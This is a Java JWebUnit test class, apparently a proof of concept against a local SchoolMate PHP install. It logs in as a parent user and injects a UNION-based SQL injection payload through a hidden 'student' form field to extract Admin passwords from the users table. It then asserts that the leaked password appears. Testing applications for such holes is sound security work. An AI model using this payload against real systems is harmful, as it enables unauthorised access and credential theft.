/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package sql_index.php_1_min.dot;

import net.sourceforge.jwebunit.junit.WebTester;
import org.junit.After;
import org.junit.AfterClass;
import org.junit.Before;
import org.junit.BeforeClass;
import org.junit.Test;
import static org.junit.Assert.*;

/**
 *
 * @author iono
 */
public class sql_index_php_1 {
    
    WebTester tester = new WebTester();
    
    @Before
    public void setUp() {
        tester.setBaseUrl("http://localhost/schoolmate/");
        tester.beginAt("index.php");
        tester.setTextField("username", "parent");
        tester.setTextField("password", "parent");
        tester.submit();
        tester.clickElementByXPath("//td/a");
        
    }
    
    @Test
    public void Attack() {
        String sql_injection = "9999 union select password,password,'' from users where type ='Admin'";
        tester.setHiddenField("page2", "5");
        tester.setHiddenField("logout", "");
        tester.setHiddenField("page", "5");
        tester.setHiddenField("selectclass", "");
        tester.setHiddenField("student", sql_injection);
        tester.clickElementByXPath("//table/tbody/tr/td[1]/form/a[2]");
        tester.assertMatch("1234 1234.*", tester.getElementTextByXPath("//table/tbody/tr/td/h1"));

        //
        
    }
    // TODO add test methods here.
    // The methods must be annotated with annotation @Test. For example:
    //
    
}
